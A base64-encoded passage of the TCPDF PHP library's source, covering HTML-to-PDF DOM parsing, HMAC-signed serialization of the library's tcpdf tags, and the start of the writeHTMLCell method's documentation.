JCQkJfSBlbHNlIHsKCQkJCQkJCQkkZG9tWyRrZXldWydmb250c2l6ZSddID0gaW50dmFsKCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydzaXplJ10pOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJCS8vIGZvcmNlIG5hdHVyYWwgYWxpZ25tZW50IGZvciBsaXN0cwoJCQkJCWlmICgoKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ3VsJykgT1IgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ29sJykgT1IgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ2RsJykpCgkJCQkJCUFORCAoIWlzc2V0KCRkb21bJGtleV1bJ2FsaWduJ10pIE9SIFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRkb21bJGtleV1bJ2FsaWduJ10pIE9SICgkZG9tWyRrZXldWydhbGlnbiddICE9ICdKJykpKSB7CgkJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkkZG9tWyRrZXldWydhbGlnbiddID0gJ1InOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJGRvbVska2V5XVsnYWxpZ24nXSA9ICdMJzsKCQkJCQkJfQoJCQkJCX0KCQkJCQlpZiAoKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ3NtYWxsJykgT1IgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ3N1cCcpIE9SICgkZG9tWyRrZXldWyd2YWx1ZSddID09ICdzdWInKSkgewoJCQkJCQlpZiAoIWlzc2V0KCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydzaXplJ10pIEFORCAhaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsnZm9udC1zaXplJ10pKSB7CgkJCQkJCQkkZG9tWyRrZXldWydmb250c2l6ZSddID0gJGRvbVska2V5XVsnZm9udHNpemUnXSAqIEtfU01BTExfUkFUSU87CgkJCQkJCX0KCQkJCQl9CgkJCQkJaWYgKCgkZG9tWyRrZXldWyd2YWx1ZSddID09ICdzdHJvbmcnKSBPUiAoJGRvbVska2V5XVsndmFsdWUnXSA9PSAnYicpKSB7CgkJCQkJCSRkb21bJGtleV1bJ2ZvbnRzdHlsZSddIC49ICdCJzsKCQkJCQl9CgkJCQkJaWYgKCgkZG9tWyRrZXldWyd2YWx1ZSddID09ICdlbScpIE9SICgkZG9tWyRrZXldWyd2YWx1ZSddID09ICdpJykpIHsKCQkJCQkJJGRvbVska2V5XVsnZm9udHN0eWxlJ10gLj0gJ0knOwoJCQkJCX0KCQkJCQlpZiAoJGRvbVska2V5XVsndmFsdWUnXSA9PSAndScpIHsKCQkJCQkJJGRvbVska2V5XVsnZm9udHN0eWxlJ10gLj0gJ1UnOwoJCQkJCX0KCQkJCQlpZiAoKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ2RlbCcpIE9SICgkZG9tWyRrZXldWyd2YWx1ZSddID09ICdzJykgT1IgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ3N0cmlrZScpKSB7CgkJCQkJCSRkb21bJGtleV1bJ2ZvbnRzdHlsZSddIC49ICdEJzsKCQkJCQl9CgkJCQkJaWYgKCFpc3NldCgkZG9tWyRrZXldWydzdHlsZSddWyd0ZXh0LWRlY29yYXRpb24nXSkgQU5EICgkZG9tWyRrZXldWyd2YWx1ZSddID09ICdhJykpIHsKCQkJCQkJJGRvbVska2V5XVsnZm9udHN0eWxlJ10gPSAkdGhpcy0+aHRtbExpbmtGb250U3R5bGU7CgkJCQkJfQoJCQkJCWlmICgoJGRvbVska2V5XVsndmFsdWUnXSA9PSAncHJlJykgT1IgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ3R0JykpIHsKCQkJCQkJJGRvbVska2V5XVsnZm9udG5hbWUnXSA9ICR0aGlzLT5kZWZhdWx0X21vbm9zcGFjZWRfZm9udDsKCQkJCQl9CgkJCQkJaWYgKCFlbXB0eSgkZG9tWyRrZXldWyd2YWx1ZSddKSBBTkQgKCRkb21bJGtleV1bJ3ZhbHVlJ11bMF0gPT0gJ2gnKSBBTkQgKGludHZhbCgkZG9tWyRrZXldWyd2YWx1ZSddWzFdKSA+IDApIEFORCAoaW50dmFsKCRkb21bJGtleV1bJ3ZhbHVlJ11bMV0pIDwgNykpIHsKCQkJCQkJLy8gaGVhZGluZ3MgaDEsIGgyLCBoMywgaDQsIGg1LCBoNgoJCQkJCQlpZiAoIWlzc2V0KCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydzaXplJ10pIEFORCAhaXNzZXQoJGRvbVska2V5XVsnc3R5bGUnXVsnZm9udC1zaXplJ10pKSB7CgkJCQkJCQkkaGVhZHNpemUgPSAoNCAtIGludHZhbCgkZG9tWyRrZXldWyd2YWx1ZSddWzFdKSkgKiAyOwoJCQkJCQkJJGRvbVska2V5XVsnZm9udHNpemUnXSA9ICRkb21bMF1bJ2ZvbnRzaXplJ10gKyAkaGVhZHNpemU7CgkJCQkJCX0KCQkJCQkJaWYgKCFpc3NldCgkZG9tWyRrZXldWydzdHlsZSddWydmb250LXdlaWdodCddKSkgewoJCQkJCQkJJGRvbVska2V5XVsnZm9udHN0eWxlJ10gLj0gJ0InOwoJCQkJCQl9CgkJCQkJfQoJCQkJCWlmICgoJGRvbVska2V5XVsndmFsdWUnXSA9PSAndGFibGUnKSkgewoJCQkJCQkkZG9tWyRrZXldWydyb3dzJ10gPSAwOyAvLyBudW1iZXIgb2Ygcm93cwoJCQkJCQkkZG9tWyRrZXldWyd0cmlkcyddID0gYXJyYXkoKTsgLy8gSURzIG9mIFRSIGVsZW1lbnRzCgkJCQkJCSRkb21bJGtleV1bJ3RoZWFkJ10gPSAnJzsgLy8gdGFibGUgaGVhZGVyIHJvd3MKCQkJCQl9CgkJCQkJaWYgKCgkZG9tWyRrZXldWyd2YWx1ZSddID09ICd0cicpKSB7CgkJCQkJCSRkb21bJGtleV1bJ2NvbHMnXSA9IDA7CgkJCQkJCWlmICgkdGhlYWQpIHsKCQkJCQkJCSRkb21bJGtleV1bJ3RoZWFkJ10gPSB0cnVlOwoJCQkJCQkJLy8gcm93cyBvbiB0aGVhZCBibG9jayBhcmUgcHJpbnRlZCBhcyBhIHNlcGFyYXRlIHRhYmxlCgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkZG9tWyRrZXldWyd0aGVhZCddID0gZmFsc2U7CgkJCQkJCQkkcGFyZW50ID0gJGRvbVska2V5XVsncGFyZW50J107CgoJCQkJCQkJaWYgKCFpc3NldCgkZG9tWyRwYXJlbnRdWydyb3dzJ10pKSB7CgkJCQkJCQkJJGRvbVskcGFyZW50XVsncm93cyddID0gMDsKCQkJCQkJCX0KCQkJCQkJCS8vIHN0b3JlIHRoZSBudW1iZXIgb2Ygcm93cyBvbiB0YWJsZSBlbGVtZW50CgkJCQkJCQkrKyRkb21bJHBhcmVudF1bJ3Jvd3MnXTsKCgkJCQkJCQlpZiAoIWlzc2V0KCRkb21bJHBhcmVudF1bJ3RyaWRzJ10pKSB7CgkJCQkJCQkJJGRvbVskcGFyZW50XVsndHJpZHMnXSA9IGFycmF5KCk7CgkJCQkJCQl9CgoJCQkJCQkJLy8gc3RvcmUgdGhlIFRSIGVsZW1lbnRzIElEcyBvbiB0YWJsZSBlbGVtZW50CgkJCQkJCQlhcnJheV9wdXNoKCRkb21bJHBhcmVudF1bJ3RyaWRzJ10sICRrZXkpOwoJCQkJCQl9CgkJCQkJfQoJCQkJCWlmICgoJGRvbVska2V5XVsndmFsdWUnXSA9PSAndGgnKSBPUiAoJGRvbVska2V5XVsndmFsdWUnXSA9PSAndGQnKSkgewoJCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2NvbHNwYW4nXSkpIHsKCQkJCQkJCSRjb2xzcGFuID0gaW50dmFsKCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydjb2xzcGFuJ10pOwoJCQkJCQl9IGVsc2UgewoJCQkJCQkJJGNvbHNwYW4gPSAxOwoJCQkJCQl9CgkJCQkJCSRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydjb2xzcGFuJ10gPSAkY29sc3BhbjsKCQkJCQkJJGRvbVsoJGRvbVska2V5XVsncGFyZW50J10pXVsnY29scyddICs9ICRjb2xzcGFuOwoJCQkJCX0KCQkJCQkvLyB0ZXh0IGRpcmVjdGlvbgoJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnZGlyJ10pKSB7CgkJCQkJCSRkb21bJGtleV1bJ2RpciddID0gJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2RpciddOwoJCQkJCX0KCQkJCQkvLyBzZXQgZm9yZWdyb3VuZCBjb2xvciBhdHRyaWJ1dGUKCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2NvbG9yJ10pIEFORCAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydjb2xvciddKSkpIHsKCQkJCQkJJGRvbVska2V5XVsnZmdjb2xvciddID0gVENQREZfQ09MT1JTOjpjb252ZXJ0SFRNTENvbG9yVG9EZWMoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2NvbG9yJ10sICR0aGlzLT5zcG90X2NvbG9ycyk7CgkJCQkJfSBlbHNlaWYgKCFpc3NldCgkZG9tWyRrZXldWydzdHlsZSddWydjb2xvciddKSBBTkQgKCRkb21bJGtleV1bJ3ZhbHVlJ10gPT0gJ2EnKSkgewoJCQkJCQkkZG9tWyRrZXldWydmZ2NvbG9yJ10gPSAkdGhpcy0+aHRtbExpbmtDb2xvckFycmF5OwoJCQkJCX0KCQkJCQkvLyBzZXQgYmFja2dyb3VuZCBjb2xvciBhdHRyaWJ1dGUKCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2JnY29sb3InXSkgQU5EICghVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2JnY29sb3InXSkpKSB7CgkJCQkJCSRkb21bJGtleV1bJ2JnY29sb3InXSA9IFRDUERGX0NPTE9SUzo6Y29udmVydEhUTUxDb2xvclRvRGVjKCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydiZ2NvbG9yJ10sICR0aGlzLT5zcG90X2NvbG9ycyk7CgkJCQkJfQoJCQkJCS8vIHNldCBzdHJva2UgY29sb3IgYXR0cmlidXRlCgkJCQkJaWYgKGlzc2V0KCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydzdHJva2Vjb2xvciddKSBBTkQgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnc3Ryb2tlY29sb3InXSkpKSB7CgkJCQkJCSRkb21bJGtleV1bJ3N0cm9rZWNvbG9yJ10gPSBUQ1BERl9DT0xPUlM6OmNvbnZlcnRIVE1MQ29sb3JUb0RlYygkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnc3Ryb2tlY29sb3InXSwgJHRoaXMtPnNwb3RfY29sb3JzKTsKCQkJCQl9CgkJCQkJLy8gY2hlY2sgZm9yIHdpZHRoIGF0dHJpYnV0ZQoJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnd2lkdGgnXSkpIHsKCQkJCQkJJGRvbVska2V5XVsnd2lkdGgnXSA9ICRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWyd3aWR0aCddOwoJCQkJCX0KCQkJCQkvLyBjaGVjayBmb3IgaGVpZ2h0IGF0dHJpYnV0ZQoJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnaGVpZ2h0J10pKSB7CgkJCQkJCSRkb21bJGtleV1bJ2hlaWdodCddID0gJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2hlaWdodCddOwoJCQkJCX0KCQkJCQkvLyBjaGVjayBmb3IgdGV4dCBhbGlnbm1lbnQKCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2FsaWduJ10pIEFORCAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRkb21bJGtleV1bJ2F0dHJpYnV0ZSddWydhbGlnbiddKSkgQU5EICgkZG9tWyRrZXldWyd2YWx1ZSddICE9PSAnaW1nJykpIHsKCQkJCQkJJGRvbVska2V5XVsnYWxpZ24nXSA9IHN0cnRvdXBwZXIoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2FsaWduJ11bMF0pOwoJCQkJCX0KCQkJCQkvLyBjaGVjayBmb3IgdGV4dCByZW5kZXJpbmcgbW9kZSAodGhlIGZvbGxvd2luZyBhdHRyaWJ1dGVzIGRvIG5vdCBleGlzdCBpbiBIVE1MKQoJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnc3Ryb2tlJ10pKSB7CgkJCQkJCS8vIGZvbnQgc3Ryb2tlIHdpZHRoCgkJCQkJCSRkb21bJGtleV1bJ3N0cm9rZSddID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnc3Ryb2tlJ10sICRkb21bJGtleV1bJ2ZvbnRzaXplJ10sICdwdCcsIHRydWUpOwoJCQkJCX0KCQkJCQlpZiAoaXNzZXQoJGRvbVska2V5XVsnYXR0cmlidXRlJ11bJ2ZpbGwnXSkpIHsKCQkJCQkJLy8gZm9udCBmaWxsCgkJCQkJCWlmICgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnZmlsbCddID09ICd0cnVlJykgewoJCQkJCQkJJGRvbVska2V5XVsnZmlsbCddID0gdHJ1ZTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRkb21bJGtleV1bJ2ZpbGwnXSA9IGZhbHNlOwoJCQkJCQl9CgkJCQkJfQoJCQkJCWlmIChpc3NldCgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnY2xpcCddKSkgewoJCQkJCQkvLyBjbGlwcGluZyBtb2RlCgkJCQkJCWlmICgkZG9tWyRrZXldWydhdHRyaWJ1dGUnXVsnY2xpcCddID09ICd0cnVlJykgewoJCQkJCQkJJGRvbVska2V5XVsnY2xpcCddID0gdHJ1ZTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCSRkb21bJGtleV1bJ2NsaXAnXSA9IGZhbHNlOwoJCQkJCQl9CgkJCQkJfQoJCQkJfSAvLyBlbmQgb3BlbmluZyB0YWcKCQkJfSBlbHNlIHsKCQkJCS8vIHRleHQKCQkJCSRkb21bJGtleV1bJ3RhZyddID0gZmFsc2U7CgkJCQkkZG9tWyRrZXldWydibG9jayddID0gZmFsc2U7CgkJCQkkZG9tWyRrZXldWydwYXJlbnQnXSA9IGVuZCgkbGV2ZWwpOwoJCQkJJGRvbVska2V5XVsnZGlyJ10gPSAkZG9tWyRkb21bJGtleV1bJ3BhcmVudCddXVsnZGlyJ107CgkJCQlpZiAoIWVtcHR5KCRkb21bJGRvbVska2V5XVsncGFyZW50J11dWyd0ZXh0LXRyYW5zZm9ybSddKSkgewoJCQkJCS8vIHRleHQtdHJhbnNmb3JtIGZvciB1bmljb2RlIHJlcXVpcmVzIG1iX2NvbnZlcnRfY2FzZSAoTXVsdGlieXRlIFN0cmluZyBGdW5jdGlvbnMpCgkJCQkJaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWJfY29udmVydF9jYXNlJykpIHsKCQkJCQkJJHR0bSA9IGFycmF5KCdjYXBpdGFsaXplJyA9PiBNQl9DQVNFX1RJVExFLCAndXBwZXJjYXNlJyA9PiBNQl9DQVNFX1VQUEVSLCAnbG93ZXJjYXNlJyA9PiBNQl9DQVNFX0xPV0VSKTsKCQkJCQkJaWYgKGlzc2V0KCR0dG1bJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ3RleHQtdHJhbnNmb3JtJ11dKSkgewoJCQkJCQkJJGVsZW1lbnQgPSBtYl9jb252ZXJ0X2Nhc2UoJGVsZW1lbnQsICR0dG1bJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ3RleHQtdHJhbnNmb3JtJ11dLCAkdGhpcy0+ZW5jb2RpbmcpOwoJCQkJCQl9CgkJCQkJfSBlbHNlaWYgKCEkdGhpcy0+aXN1bmljb2RlKSB7CgkJCQkJCXN3aXRjaCAoJGRvbVskZG9tWyRrZXldWydwYXJlbnQnXV1bJ3RleHQtdHJhbnNmb3JtJ10pIHsKCQkJCQkJCWNhc2UgJ2NhcGl0YWxpemUnOiB7CgkJCQkJCQkJJGVsZW1lbnQgPSB1Y3dvcmRzKHN0cnRvbG93ZXIoJGVsZW1lbnQpKTsKCQkJCQkJCQlicmVhazsKCQkJCQkJCX0KCQkJCQkJCWNhc2UgJ3VwcGVyY2FzZSc6IHsKCQkJCQkJCQkkZWxlbWVudCA9IHN0cnRvdXBwZXIoJGVsZW1lbnQpOwoJCQkJCQkJCWJyZWFrOwoJCQkJCQkJfQoJCQkJCQkJY2FzZSAnbG93ZXJjYXNlJzogewoJCQkJCQkJCSRlbGVtZW50ID0gc3RydG9sb3dlcigkZWxlbWVudCk7CgkJCQkJCQkJYnJlYWs7CgkJCQkJCQl9CgkJCQkJCX0KCQkJCQl9CgkJCQkJJGVsZW1lbnQgPSBwcmVnX3JlcGxhY2UoIi8mTkJTUDsvaSIsICImbmJzcDsiLCAkZWxlbWVudCk7CgkJCQl9CgkJCQkkZG9tWyRrZXldWyd2YWx1ZSddID0gc3RyaXBzbGFzaGVzKCR0aGlzLT51bmh0bWxlbnRpdGllcygkZWxlbWVudCkpOwoJCQl9CgkJCSsrJGVsa2V5OwoJCQkrKyRrZXk7CgkJfQoJCXJldHVybiAkZG9tOwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgc3RyaW5nIHVzZWQgdG8gZmluZCBzcGFjZXMKCSAqIEByZXR1cm4gc3RyaW5nCgkgKiBAcHJvdGVjdGVkCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDQuOC4wMjQgKDIwMTAtMDEtMTUpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBnZXRTcGFjZVN0cmluZygpIHsKCQkkc3BhY2VzdHIgPSBjaHIoMzIpOwoJCWlmICgkdGhpcy0+aXNVbmljb2RlRm9udCgpKSB7CgkJCSRzcGFjZXN0ciA9IGNocigwKS5jaHIoMzIpOwoJCX0KCQlyZXR1cm4gJHNwYWNlc3RyOwoJfQoKCS8qKgoJICogQ2FsY3VsYXRlcyB0aGUgaGFzaCB2YWx1ZSBvZiB0aGUgZ2l2ZW4gZGF0YS4KCSAqCgkgKiBAcGFyYW0gc3RyaW5nICRkYXRhIFRoZSBkYXRhIHRvIGJlIGhhc2hlZC4KCSAqIEByZXR1cm4gc3RyaW5nIFRoZSBoYXNoZWQgdmFsdWUgb2YgdGhlIGRhdGEuCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBoYXNoVENQREZ0YWcoJGRhdGEpIHsKCQlyZXR1cm4gaGFzaF9obWFjKCdzaGEyNTYnLCAkZGF0YSwgJHRoaXMtPmhhc2hfa2V5LCBmYWxzZSk7Cgl9CgoJLyoqCgkgKiBTZXJpYWxpemUgZGF0YSB0byBiZSB1c2VkIHdpdGggVENQREYgdGFnIGluIEhUTUwgY29kZS4KCSAqIEBwYXJhbSBzdHJpbmcgJG1ldGhvZCBUQ1BERiBtZXRob2QgbmFtZQoJICogQHBhcmFtIGFycmF5ICRwYXJhbXMgTWV0aG9kIHBhcmFtZXRlcnMKCSAqIEByZXR1cm4gc3RyaW5nIFNlcmlhbGl6ZWQgZGF0YQoJICogQHB1YmxpYyBzdGF0aWMKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNlcmlhbGl6ZVRDUERGdGFnKCRtZXRob2QsICRwYXJhbXM9YXJyYXkoKSkgewoJCSRkYXRhID0gYXJyYXkoJ20nID0+ICRtZXRob2QsICdwJyA9PiAkcGFyYW1zKTsKCQkkZW5jb2RlZCA9IHVybGVuY29kZShqc29uX2VuY29kZSgkZGF0YSkpOwoJCSRoYXNoID0gJHRoaXMtPmhhc2hUQ1BERnRhZygkZW5jb2RlZCk7CgkJcmV0dXJuIHN0cmxlbigkaGFzaCkuJysnLiRoYXNoLicrJy4kZW5jb2RlZDsKCX0KCgkvKioKCSAqIFVuc2VyaWFsaXplIGRhdGEgdG8gYmUgdXNlZCB3aXRoIFRDUERGIHRhZyBpbiBIVE1MIGNvZGUuCgkgKiBAcGFyYW0gc3RyaW5nICRkYXRhIHNlcmlhbGl6ZWQgZGF0YQoJICogQHJldHVybiBhcnJheSBjb250YWluaW5nIHVuc2VyaWFsaXplZCBkYXRhCgkgKiBAcHJvdGVjdGVkIHN0YXRpYwoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gdW5zZXJpYWxpemVUQ1BERnRhZygkZGF0YSkgewoJCSRocG9zID0gc3RycG9zKCRkYXRhLCAnKycpOwoJCSRobGVuID0gaW50dmFsKHN1YnN0cigkZGF0YSwgMCwgJGhwb3MpKTsKCQkkaGFzaCA9IHN1YnN0cigkZGF0YSwgJGhwb3MgKyAxLCAkaGxlbik7CgkJJGVuY29kZWQgPSBzdWJzdHIoJGRhdGEsICRocG9zICsgMiArICRobGVuKTsKCQlpZiAoIWhhc2hfZXF1YWxzKCAkdGhpcy0+aGFzaFRDUERGdGFnKCRlbmNvZGVkKSwgJGhhc2gpKSB7CgkJCSR0aGlzLT5FcnJvcignSW52YWxpZCBwYXJhbWV0ZXJzJyk7CgkJfQoJCXJldHVybiBqc29uX2RlY29kZSh1cmxkZWNvZGUoJGVuY29kZWQpLCB0cnVlKTsKCX0KCgkvKioKCSAqIENoZWNrIGlmIGEgVENQREYgdGFnIGlzIGFsbG93ZWQKCSAqIEBwYXJhbSBzdHJpbmcgJG1ldGhvZCBUQ1BERiBtZXRob2QgbmFtZQoJICogQHJldHVybiBib29sZWFuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBhbGxvd2VkVENQREZ0YWcoJG1ldGhvZCkgewoJCWlmIChkZWZpbmVkKCdLX0FMTE9XRURfVENQREZfVEFHUycpKSB7CgkJCXJldHVybiAoc3RycG9zKEtfQUxMT1dFRF9UQ1BERl9UQUdTLCAnfCcuJG1ldGhvZC4nfCcpICE9PSBmYWxzZSk7CgkJfQoJCXJldHVybiBmYWxzZTsKCX0KCgkvKioKCSAqIFByaW50cyBhIGNlbGwgKHJlY3Rhbmd1bGFyIGFyZWEpIHdpdGggb3B0aW9uYWwgYm9yZGVycywgYmFja2dyb3VuZCBjb2xvciBhbmQgaHRtbCB0ZXh0IHN0cmluZy4KCSAqIFRoZSB1cHBlci1sZWZ0IGNvcm5lciBvZiB0aGUgY2VsbCBjb3JyZXNwb25kcyB0byB0aGUgY3VycmVudCBwb3NpdGlvbi4gQWZ0ZXIgdGhlIGNhbGwsIHRoZSBjdXJyZW50IHBvc2l0aW9uIG1vdmVzIHRvIHRoZSByaWdodCBvciB0byB0aGUgbmV4dCBsaW5lLjxiciAvPgoJICogSWYgYXV0b21hdGljIHBhZ2UgYnJlYWtpbmcgaXMgZW5hYmxlZCBhbmQgdGhlIGNlbGwgZ29lcyBiZXlvbmQgdGhlIGxpbWl0LCBhIHBhZ2UgYnJlYWsgaXMgZG9uZSBiZWZvcmUgb3V0cHV0dGluZy4KCSAqIElNUE9SVEFOVDogVGhlIEhUTUwgbXVzdCBiZSB3ZWxsIGZvcm1hdHRlZCAtIHRyeSB0byBjbGVhbi11cCBpdCB1c2luZyBhbiBhcHBsaWNhdGlvbiBsaWtlIEhUTUwtVGlkeSBiZWZvcmUgc3VibWl0dGluZy4KCSAqIFN1cHBvcnRlZCB0YWdzIGFyZTogYSwgYiwgYmxvY2txdW90ZSwgYnIsIGRkLCBkZWwsIGRpdiwgZGwsIGR0LCBlbSwgZm9udCwgaDEsIGgyLCBoMywgaDQsIGg1LCBoNiwgaHIsIGksIGltZywgbGksIG9sLCBwLCBwcmUsIHNtYWxsLCBzcGFuLCBzdHJvbmcsIHN1Yiwgc3VwLCB0YWJsZSwgdGNwZGYsIHRkLCB0aCwgdGhlYWQsIHRyLCB0dCwgdSwgdWwKCSAqIE5PVEU6IGFsbCB0aGUgSFRNTCBhdHRyaWJ1dGVzIG11c3QgYmUgZW5jbG9zZWQgaW4gZG91YmxlLXF1b3RlLgoJICogQHBhcmFtIGZsb2F0ICR3IENlbGwgd2lkdGguIElmIDAsIHRoZSBjZWxsIGV4dGVuZHMgdXAgdG8gdGhlIHJpZ2h0IG1hcmdpbi4KCSAqIEBwYXJhbSBmbG9hdCAkaCBDZWxsIG1pbmltdW0gaGVpZ2h0LiBUaGUgY2VsbCBleHRlbmRzIGF1dG9tYXRpY2FsbHkgaWYgbmVlZGVkLgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHggdXBwZXItbGVmdCBjb3JuZXIgWCBjb29yZGluYXRlCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeSB1cHBlci1sZWZ0IGNvcm5lciBZIGNvb3JkaW5hdGUKCSAqIEBwYXJhbSBzdHJpbmcgJGh0bWwgaHRtbCB0ZXh0IHRvIHByaW50LiBEZWZhdWx0IHZhbHVlOiBlbXB0eSBzdHJpbmcuCgkgKiBAcGFyYW0gbWl4ZWQgJGJvcmRlciBJbmRpY2F0ZXMgaWYgYm9yZGVycyBtdXN0IGJlIGRyYXduIGFyb3VuZCB0aGUgY2VsbC4gVGhlIHZhbHVlIGNhbiBiZSBhIG51bWJlcjo8dWw+PGxpPjA6IG5vIGJvcmRlciAoZGVmYXVsdCk8L2xpPjxsaT4xOiBmcmFtZTwvbGk+PC91bD4gb3IgYSBzdHJpbmcgY29udGFpbmluZyBzb21lIG9yIGFsbCBvZiB0aGUgZm9sbG93aW5nIGNoYXJhY3RlcnMgKGluIGFueSBvcmRlcik6PHVsPjxsaT5MOiBsZWZ0PC9saT48bGk+VDogdG9wPC9saT48bGk+UjogcmlnaHQ8L2xpPjxsaT5COiBib3R0b208L2xpPjwvdWw+IG9yIGFuIGFycmF5IG9mIGxpbmUgc3R5bGVzIGZvciBlYWNoIGJvcmRlciBncm91cCAtIGZvciBleGFtcGxlOiBhcnJheSgnTFRSQicgPT4gYXJyYXkoJ3dpZHRoJyA9PiAyLCAnY2FwJyA9PiAnYnV0dCcsICdqb2luJyA9PiAnbWl0ZXInLCAnZGFzaCcgPT4gMCwgJ2NvbG9yJyA9PiBhcnJheSgwLCAwLCAwKSkpCgkgKiBAcGFyYW0gaW50ICRsbiBJbmRpY2F0ZXMgd2hlcmUgdGhlIGN1cnJlbnQgcG9zaXRpb24gc2hvdWxkIGdvIGFmdGVyIHRoZSBjYWxsLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+MDogdG8gdGhlIHJpZ2h0IChvciBsZWZ0IGZvciBSVEwgbGFuZ3VhZ2UpPC9saT48bGk+MTogdG8gdGhlIGJlZ2lubmluZyBvZiB0aGUgbmV4dCBsaW5lPC9saT48bGk+MjogYmVsb3c8L2xpPjwvdWw+IFB1dHRpbmcgMSBpcyBlcXVpdmFsZW50IHRvIHB1dHRpbmcgMCBhbmQgY2FsbGluZyBMbigpIGp1c3QgYWZ0ZXIuIERlZmF1bHQgdmFsdWU6IDAuCgkgKiBAcGFyYW0gYm9vbGVhbiAkZmlsbCBJbmRpY2F0ZXMgaWYgdGhlIGNlbGwgYmFja2dyb3VuZCBtdXN0IGJlIHBhaW50ZWQgKHRydWUpIG9yIHRyYW5zcGFyZW50IChmYWxzZSkuCgkgKiBAcGFyYW0gYm9vbGVhbiAkcmVzZXRoIGlmIHRydWUgcmVzZXQgdGhlIGxhc3QgY2VsbCBoZWlnaHQgKGRlZmF1bHQgdHJ1ZSkuCgkgKiBAcGFyYW0gc3RyaW5nICRhbGlnbiBBbGxvd3MgdG8gY2VudGVyIG9yIGFsaWduIHRoZSB0ZXh0LiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+TCA6IGxlZnQgYWxpZ248L2xpPjxsaT5DIDogY2VudGVyPC9saT48bGk+UiA6IHJpZ2h0IGFsaWduPC9saT48bGk+JycgOiBlbXB0eSBzdHJpbmcgOiBsZWZ0IGZvciBMVFIgb3IgcmlnaHQgZm9yIFJUTDwvbGk+PC91bD4KCSAqIEBwYXJhbSBib29sZWFuICRhdXRvcGFkZGluZyBpZiB0cnVlLCB1c2VzIGludGVybmFsIHBhZGRpbmcgYW5kIGF1dG9tYXRpY2FsbHkgYWRqdXN0IGl0IHRvIGFjY291bnQgZm9yIGxpbmUgd2lkdGguCgkgKiBAc2VlIE11bHRpY2VsbCgpLCB3cml0ZUhUTUwoKQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gd3JpdGVIVE1MQ2VsbCgkdywgJGgsICR4LCAkeSwgJGh0bWw9JycsICRib3JkZXI9MCwgJGxuPTAsICRmaWxsPWZhbHNlLCAkcmVzZXRoPXRydWUsICRhbGlnbj0nJywgJGF1dG9wYWRkaW5nPXRydWUpIHsKCQlyZXR1cm4gJHRoaXMtPk11bHRpQ2VsbCgkdywgJGgsICRodG1sLCAkYm9yZGVyLCAkYWxpZ24sICRmaWxsLCAkbG4sICR4LCAkeSwgJHJlc2V0aCwgMCwgdHJ1ZSwgJGF1dG9